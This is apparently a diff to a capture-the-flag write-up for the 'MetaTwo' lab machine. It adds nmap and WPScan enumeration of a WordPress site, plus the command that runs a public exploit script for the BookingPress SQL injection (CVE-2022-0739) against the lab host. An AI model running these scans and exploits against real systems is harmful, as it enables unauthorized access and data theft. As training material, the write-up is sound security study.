@@ -35,7 +35,7 @@ PORT   STATE SERVICE
 80/tcp open  http                                                                                                                                                          
                                                                                      
 Nmap done: 1 IP address (1 host up) scanned in 608.38 seconds
-➜  metatwo nmap -sC -sV -p 21,22,80 10.10.11.186 -oN enum-ports.nmap                  
+▶ nmap -sC -sV -p 21,22,80 10.10.11.186 -oN enum-ports.nmap                  
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 13:13 IST
 Nmap scan report for 10.10.11.186
 Host is up (0.18s latency).
@@ -81,4 +81,26 @@ Nmap done: 1 IP address (1 host up) scanned in 214.25 seconds
 - Plugin: `Booking Press Appointment Booking`
 
 ---
+
+## WordPress
+### WPScan
+```
+▶ wpscan --url http://metapress.htb --disable-tls-checks --plugins-detection aggressive
+```
+### Wordpress Version
+![image](https://user-images.githubusercontent.com/83878909/233022798-dfaef73b-dda4-4102-89f9-dee2e61aa871.png)
+### Plugins
+![image](https://user-images.githubusercontent.com/83878909/233045498-7825f211-1b68-4654-a7e0-31e5071e8186.png)
+
+---
+
+## Exploit (CVE-2022-0739)
+### SQL Injection
+  - Expolit: https://github.com/destr4ct/CVE-2022-0739
+
+```CSS
+▶ python booking-press-expl.py --url http://metapress.htb --nonce 55b094723b
+```
+![image](https://user-images.githubusercontent.com/83878909/233048115-82eca30b-607b-466f-820d-1c011dc1c67c.png)
+
 
